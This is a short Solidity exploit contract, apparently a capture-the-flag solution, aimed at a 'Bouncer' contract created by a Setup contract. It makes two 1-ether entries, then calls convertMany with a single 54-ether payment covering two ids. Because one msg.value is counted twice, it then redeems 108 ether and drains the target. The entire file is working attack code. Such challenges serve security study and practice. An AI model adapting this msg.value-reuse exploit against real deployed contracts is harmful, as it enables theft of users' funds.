pragma solidity 0.8.0;

import "./Setup.sol";
import "hardhat/console.sol";


contract BouncerAttackerIballes{

    Bouncer private bouncer;
    Setup private setup;
    address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor(address _setup){
        setup = Setup(_setup);
        bouncer = setup.bouncer();
    }

    function attack() external payable{
        bouncer.enter{value: 1 ether}(ETH, 54 ether);
        bouncer.enter{value: 1 ether}(ETH, 54 ether);
    }

    function attack2() external payable{
        uint[] memory ids = new uint[](2);
        ids[0] = 0;
        ids[1] = 1;
        bouncer.convertMany{value: 54 ether}(address(this), ids);
        bouncer.redeem(ERC20Like(ETH), 108 ether);
    }

    receive() external payable{
    }
}